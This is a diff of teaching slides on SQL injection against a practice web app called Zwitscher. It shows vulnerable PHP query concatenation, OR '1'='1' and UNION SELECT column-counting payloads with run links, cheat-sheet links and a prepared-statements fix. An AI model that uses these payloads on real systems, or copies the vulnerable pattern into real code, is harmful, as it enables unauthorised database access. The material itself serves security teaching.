@@ -6,15 +6,14 @@
 
 - **S**tructured **Q**uery **L**anguage
 - Language to query databases
-- Commonly used in web applications
+- Often used in web applications
 - LAMP ( Linux / Apache / MySQL / PHP )
 
 ---
 
 ## Example queries
 
-- [SELECT](http://www.w3schools.com/sql/sql_select.asp) - Selects which fields will be returned
-- [FROM](http://www.w3schools.com/sql/sql_select.asp) - Selects the table
+- [SELECT ... FROM ...](http://www.w3schools.com/sql/sql_select.asp) - Select data from database
 - [WHERE](http://www.w3schools.com/sql/sql_where.asp) - Optional: Allows to formulate conditions
 
 ```sql
@@ -33,11 +32,6 @@ SELECT user FROM zwitscher WHERE message = 'Things always end well.';
 
 ## Dynamic queries with PHP
 
-- What happens if the user enters malicious input?
-- Input is neither validated nor escaped!
-<br />
-<br />
-
 ```php
 $sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';";
 $q = mysql_query($sql);
@@ -48,7 +42,16 @@ $q = mysql_query($sql);
 <br />
 <br />
 
-<span style="color:red">Bad example! Don't do this!</span>
+<span style="color:red">Bad code! Don't do this!</span>
+
+---
+
+## Dynamic queries with PHP
+- Input is neither validated nor escaped!
+- What happens when the user enters malicious input?
+<br />
+<br />
+<span style="color:red">Bad code! Don't do this!</span>
 
 ---
 
@@ -112,7 +115,7 @@ $sql = "SELECT * FROM zwitscher WHERE hashtag = '#dog' OR '1'='1';
 ## What did we learn so far?
 
 - Obvious: User can change the keyword
-- Unwanted: Attacker can manipulate
+- Unwanted: Attacker can manipulate the query
 
 <br />
 <br />
@@ -124,16 +127,16 @@ $sql = "SELECT * FROM zwitscher WHERE hashtag = '#dog' OR '1'='1';
 
 # Yes, you should care!
 
-- Attacker can login with password
+- Attacker can login without password
 - Attacker is not limited to current table
-- SQL allows so 'concatenate' two query result tables with [UNION](http://www.w3schools.com/sql/sql_union.asp)
+- SQL allows to 'concatenate' two query result tables with [UNION](http://www.w3schools.com/sql/sql_union.asp)
 
 ---
 
 ## More about Zwitscher
 
-- [Zwitscher](../zwitscher/) does not only have a table for the message but also a table for its users
-- We know its name as well as its field names
+- [Zwitscher](../zwitscher/) hasa table for its users
+- We know its name as well as the names of its fields
 <br />
 <br />
 - Table name: *user*
@@ -168,7 +171,7 @@ $sql = "SELECT *
 
 ## Second try
 
-Approach: Get rid of interfering characters by commenting them out
+Task: Get rid of interfering characters by commenting them out
 
 --
 
@@ -207,9 +210,9 @@ $sql = "SELECT *
 
 ## What now? Brutforce!
 
-- @@VERSION returns a table with one field and one column, containing the current server version
-- @@VERSION, @@VERSION returns a table with one column and two fields, both containing the current server version
-- @@VERSION, @@VERSION, @@VERSION returns ...
+- "1" returns a table with one field and one column, containing '1'
+- "1, 2" returns a table with one column and two fields, '1' and '2'
+- "1, 2, 3" returns ...
 <br />
 <br />
 
@@ -219,15 +222,15 @@ $sql = "SELECT *
 
 ## What now? Brutforce!
 
-Input: <span style="color:crimson">#dog' UNION SELECT @@VERSION; --</span>
+Input: <span style="color:crimson">#dog' UNION SELECT 1; --</span>
 
 ```php
 $sql = "SELECT *
         FROM zwitscher
-        WHERE hashtag = '#dog' UNION SELECT @@VERSION; -- ';
+        WHERE hashtag = '#dog' UNION SELECT 1; -- ';
 ```
 
-[Run code](../zwitscher/?search=%27+UNION+SELECT+%40%40VERSION%3B+--+)
+[Run code](../zwitscher/?search=%27+UNION+SELECT+1%3B+--+)
 
 :(
 
@@ -235,15 +238,15 @@ $sql = "SELECT *
 
 ## What now? Brutforce!
 
-Input: <span style="color:crimson">#dog' UNION SELECT @@VERSION, @@VERSION; --</span>
+Input: <span style="color:crimson">#dog' UNION SELECT 1, 2; --</span>
 
 ```php
 $sql = "SELECT * 
         FROM zwitscher
-        WHERE hashtag = '#dog' UNION SELECT @@VERSION, @@VERSION; -- ';
+        WHERE hashtag = '#dog' UNION SELECT 1, 2; -- ';
 ```
 
-[Run code](../zwitscher/?search=%27+UNION+SELECT+%40%40VERSION%2C+%40%40VERSION%3B+--+)
+[Run code](../zwitscher/?search=%27+UNION+SELECT+1%2C+2%3B+--+)
 
 :(
 
@@ -251,15 +254,15 @@ $sql = "SELECT *
 
 ## What now? Brutforce!
 
-Input: <span style="color:crimson">#dog' UNION SELECT @@VERSION, @@VERSION, @@VERSION; --</span>
+Input: <span style="color:crimson">#dog' UNION SELECT 1, 2, 3; --</span>
 
 ```php
 $sql = "SELECT *
         FROM zwitscher
-        WHERE hashtag = '#dog' UNION SELECT @@VERSION, @@VERSION, @@VERSION; -- ';
+        WHERE hashtag = '#dog' UNION SELECT 1, 2, 3; -- ';
 ```
 
-[Run code](../zwitscher/?search=%27+UNION+SELECT+%40%40VERSION%2C+%40%40VERSION%2C+%40%40VERSION%3B+--+)
+[Run code](../zwitscher/?search=%27+UNION+SELECT+1%2C+2%2C+3%3B+--+)
 
 :)
 
@@ -267,9 +270,9 @@ $sql = "SELECT *
 
 ## Third Try
 
-- How many fields are there in the first query?
-- Three fields!
-- Select three fields: *username*, *mail*, *age*
+- How many columns are in the result of the first query?
+- Three columns!
+- Select three columns: *username*, *mail*, *age*
 <br />
 <br />
 
@@ -320,7 +323,7 @@ Bingo!
 
 ## How to avoid this problem?
 
-- Never trust user's input
+- Don't trust user input
 - Don't build your queries by concatenating strings
 - Use safe methods for database interaction
 - In PHP: Prepared statements
@@ -338,9 +341,8 @@ There is a third table on [Zwitscher](../zwitscher/)...
 ---
 
 ## Links
-
+- [Pentestmonkey Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
 - [Exploiting Filtered SQLi](https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections)
 - [Filter Evasion Cheat Sheet](https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql)
-- [Pentestmonkey Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
 - [Wikipedia (English)](http://en.wikipedia.org/wiki/SQL_injection)
 - [Source Code of Zwitscher](../zwitscher/?src)
